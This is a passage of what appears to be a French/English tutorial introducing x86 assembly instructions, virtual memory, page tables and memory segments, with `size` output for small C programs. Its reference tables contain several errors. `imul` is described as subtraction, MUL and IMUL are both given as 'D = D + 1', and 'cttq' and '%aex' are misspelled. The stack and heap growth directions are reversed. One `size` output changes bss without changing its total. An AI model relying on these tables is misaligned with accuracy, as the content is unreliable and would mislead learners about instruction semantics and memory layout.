      &lt;li&gt;64-bit: (EDX EAX) / 32-bit divisor = EAX(quotient) and EDX(remainder)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;idivq S&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;RDX:RAX&lt;/code&gt; / &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt; = RAX(quotient) and RDX(remainder)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;divq S&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;RDX:RAX&lt;/code&gt; / &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt; = RAX(quotient) and RDX(remainder)&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;instruction&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;inc D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;D = D + 1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dec D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;D = D - 1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;neg D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;D = -D&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;not D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;D = non D&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;binary-operations&quot;&gt;binary operations&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;instruction&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;leaq S, D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;D = S&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;add S, D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;D = D + S&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sub S, D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;D = D - S&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;imul S, D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;D = D - S&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;xor S, D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OU exclusif&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;or S, D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OU logique&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;and S, D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ET logique&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;instruction&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;définition&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MUL multiplier&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;D = D + 1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMUL multiplier&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;D = D + 1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;MUL&lt;/code&gt; multiply unsigned data&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;IMUL&lt;/code&gt; integer mutltiply signed data&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AL&lt;/code&gt;  * &lt;code class=&quot;highlighter-rouge&quot;&gt;multiplier&lt;/code&gt;(of 8-bit) = &lt;code class=&quot;highlighter-rouge&quot;&gt;AH AL&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;AX&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AX&lt;/code&gt;  * &lt;code class=&quot;highlighter-rouge&quot;&gt;multiplier&lt;/code&gt;(of 16-bit) = &lt;code class=&quot;highlighter-rouge&quot;&gt;DX AX&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EAX&lt;/code&gt; * &lt;code class=&quot;highlighter-rouge&quot;&gt;multiplier&lt;/code&gt;(of 32-bit) = &lt;code class=&quot;highlighter-rouge&quot;&gt;EDX EAX&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;imulq S&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;RAX&lt;/code&gt; * &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt;(of 32-bit) = &lt;code class=&quot;highlighter-rouge&quot;&gt;RDX:RAX&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mulq S&lt;/code&gt; -&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;RAX&lt;/code&gt; * &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt;(of 32-bit) = &lt;code class=&quot;highlighter-rouge&quot;&gt;RDX:RAX&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;logic-instructions&quot;&gt;logic instructions&lt;/h2&gt;
&lt;hr /&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;conditions&quot;&gt;conditions&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# compare desti à src avec soustraction&lt;/span&gt;
CMP desti, src

CMP DX,	00
JE  L7
...
L7: ... 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;INC	EDX
CMP	EDX, 10	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Compares whether the counter has reached 10
JLE	LP1     &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; If it is less than or equal to 10, &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;jump to LP1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# faire un saut sur un label&lt;/span&gt;
JMP	label
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;instruction&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cmp S2, S1&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;set condition codes to S1-S2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;test S2, S1&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;set condition codes to S1 &amp;amp; S2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;jump&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;définition&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;flags touchés&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jump Label&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;jump to label&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jump Addr&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;jump to address&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;je/jz Label&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;jump equal/zero&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ZF&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jne/jnz Label&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;jump not equal/nonzero&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ZF&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;js Label&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;jump if negative&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SF&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jns Label&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;jump if nonnegative&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SF&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jg/jnle Label&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;jump if greater&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OF, SF, ZF&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jge/jnl Label&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;jump if greater or Equal&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OF, SF&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jl/jnge Label&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;jump if less&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OF, SF&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;jle/jng Label&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;jump if less or equal&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OF, SF, ZF&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;data-movement&quot;&gt;data movement&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Instruction with one suffix&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;instruction&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov S, D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;move source to destination&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;push S&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;push source onto stack&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pop D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;pop to of stack into destination&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Instruction wih two suffix&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;instruction&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov S, D&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;move source to destination&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;push S&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;push source onto stack&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Instructions with no suffixes&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;instruction&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cwtl&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;convert word in %ax to doubleword in %aex&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cttq&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;convert doubleword in %eax to quadword in %rax&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cqto&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;convert quadword in %rax to octoword in %rdx:%rax&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;virtual-memory&quot;&gt;virtual memory&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Lorsque l’on lance un programme, celui-ci est chargé en mémoire afin d’être exécuté. Pour cela, un processus est créé. Ce processus ne possède pas d’accès direct à la &lt;strong&gt;mémoire physique&lt;/strong&gt; de la machine. Mais il va avoir accès à une &lt;strong&gt;mémoire virtuelle&lt;/strong&gt; d’une taille de 4 Go (sur machine 32 bits). Le processus est encapsulé dans une sandbox (bac à sable) afin d’être séparé des autres. Lors de son exécution, le processus pense être seul à s’exécuter sur la machine (ce qui n’est pas le cas).&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;page-tables&quot;&gt;page tables&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Les tables de pages sont utilisées pour créer une interface entre la mémoire virtuelle (point de vue du processus) et la mémoire physique (point de vue machine). Chaque processus est associé à une table de page. Cette table associe les espaces mémoires &lt;strong&gt;virtuelles&lt;/strong&gt; utilisés par le processus, avec des espaces &lt;strong&gt;physiques&lt;/strong&gt; de la mémoire. C’est le kernel qui réalise cette tâche.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/img/reverse-intro/gestion_memoire.png&quot; class=&quot;center&quot; alt=&quot;Gestion de la mémoire&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On peut voir sur ce schéma que le processus 1 a accès à une mémoire virtuelle. Derrière celle-ci se cache le système de table de page vue précédemment.&lt;/p&gt;

&lt;h4 id=&quot;memory-segmentation&quot;&gt;memory segmentation&lt;/h4&gt;

&lt;p&gt;Lorsqu’un programme est chargé en mémoire afin de créer un processus la mémoire est segmentée.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/img/reverse-intro/memoire.png&quot; class=&quot;center&quot; alt=&quot;Gestion de la mémoire&quot; width=&quot;200&quot; /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Section&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Déscription&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Taille&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;instructions du prog., read-only, là que commence le programme&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;fixe&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.data&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;var. globales et statiques initialisées&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;fixe&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.bss&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;var. globales et statiques non initialisées&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;fixe&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$ size ./rop # taille des sections + ajouter code&lt;/code&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Zone mémoire&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Déscription&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Adresses&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Taille&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;stack&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;var. locales des fonctions, cadre de pile (stack frame)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;croissantes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;variable&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;heap&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;pour allocation dynamique du programmeur (malloc, calloc)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;décroissantes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;variable&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;stack frame&lt;/strong&gt; : zone mémoire dans la pile, avec toutes les informations nécessaires à l’appel de cette fonction + var. locales de la fonction.&lt;/p&gt;

&lt;h4 id=&quot;example-1&quot;&gt;example&lt;/h4&gt;

&lt;p&gt;On peut utiliser la commande &lt;code class=&quot;highlighter-rouge&quot;&gt;size&lt;/code&gt; afin de connaitre la taille des séctions.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// main.c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc main.c -o a.out
$ size a.out
text	   data	    bss	    dec	    hex	filename
1537	    544	      8	   2089	    829	a.out
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;On peut voire la taille des séctions de notre exécutable de départ.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// main.c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_global&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// ou static int var_static;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc main.c -o a.out
$ size a.out
text	   data	    bss	    dec	    hex	filename
1537	    544	     12	   2089	    829	a.out
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;La variable &lt;code class=&quot;highlighter-rouge&quot;&gt;var_global&lt;/code&gt; est non initialisée, elle se retrouve donc dans la section &lt;code class=&quot;highlighter-rouge&quot;&gt;.bss&lt;/code&gt;. Même chose si nous avions définie une varaible static dans le &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// main.c&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_global_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc main.c -o a.out
